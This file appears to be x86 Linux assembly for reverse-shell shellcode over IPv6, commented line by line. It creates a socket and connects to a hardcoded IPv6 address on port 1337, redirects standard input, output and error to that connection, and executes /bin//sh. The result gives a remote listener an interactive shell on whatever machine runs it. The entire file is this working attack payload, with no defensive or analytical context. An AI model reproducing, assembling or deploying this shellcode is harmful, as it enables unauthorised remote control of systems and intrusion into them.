global _start

section .text

_start:
  ; socket
  ;; cleanup
  xor ebx, ebx
  ;; arguments
  push ebx          ; #define IP_PROTO 0
  inc ebx
  push ebx          ; #define SOCK_STREAM 1
  push 0xa          ; #define PF_INET6 10
  ;; function
  mov ecx, esp      ; pointer to args on the stack into ecx
  push 0x66
  pop eax           ; socketcall 0x66 == 102
  ;; call
  int 0x80
  ;; returned data
  xchg esi, eax     ; sockfd eax -> esi

  ; connect ipv6
  ;; cleanup
  cdq
  ;; v6rhost struct
  push dword edx    ; v6rhost.sin6_scope_id
  ;; the address fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509
  push dword 0x09553dad
  push dword 0xa923b761
  push dword 0x02102b5a
  push dword 0xa54b15fd
  push edx          ; v6rhost.sin6_flowinfo
  push word 0x3905  ; v6rhost.sin6_port = htons(1337)
  push word 0xa     ; v6rhost.sin6_family = 0xa (AF6_INET)
  ;; arguments
  mov ecx, esp      ; move our struct pointer into ECX
  push 0x1c         ; sizeof v6rhost
  push ecx          ; pointer v6rhost
  push esi          ; push sockfd onto the stack
  ;; function
  mov ecx, esp      ; pointer to args on the stack into ecx
  inc ebx
  inc ebx           ; #define SYS_CONNECT 3
  push 0x66         ; socketcall()
  pop eax
  ;; call
  int 0x80
  ;; returned data
  xchg ebx, esi     ; put sockfd into ebx for dup call

  ; dup2
  ;; setup counters
  sub ecx, ecx
  mov cl, 0x2
  ;; loop
duploop:
  mov al, 0x3f      ; SYS_DUP2 syscall
  int 0x80          ; call SYS_DUP2
  dec ecx           ; decrement loop counter
  jns duploop       ; as long as SF is not set, keep looping

  ; execve
  ;; cleanup
  xor edx, edx
  ;; command to run
  push edx          ; NULL string terminator
  push 0x68732f2f   ; hs//
  push 0x6e69622f   ; nib/
  ;; arguments
  mov ecx, edx      ; null
  mov ebx, esp      ; pointer to args into ebx
  mov al, 0x0b      ; execve systemcall
  ;; call
  int 0x80
